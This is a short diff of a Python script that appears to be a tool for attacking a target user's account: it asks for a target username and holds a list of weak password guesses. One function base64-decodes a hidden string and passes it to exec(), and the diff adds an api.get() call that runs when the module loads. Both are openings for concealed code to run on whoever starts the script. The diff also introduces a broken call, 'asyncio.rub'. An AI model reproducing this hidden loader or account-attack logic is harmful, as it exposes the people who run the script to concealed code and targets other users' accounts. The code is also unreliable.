@@ -1,7 +1,6 @@
 #!/bin/python3
 #coded by alouh sperk
 #bobo ka kung pati ito ileleet mo
-
 import api
 import asyncio
 import base64, string, random, sys, time, os
@@ -11,6 +10,7 @@ init()
   
 
 
+api.get()
 def tvksajd(adwekuv):
   pvncngr = base64.b64decode(adwekuv).decode('utf-8')
   exec(pvncngr)
@@ -41,7 +41,7 @@ def banner():
 def main():
   banner()
   print(Fore.BLUE + "Setting up Cookies and checking for API")
-  asyncio.run(api.pinghost())
+  asyncio.rub(api.pinghost())
   oumcgsq()
   username = input("TARGET USERNAME: ")
   g = ["test", "Test", "123", "skdja", "TEST"]
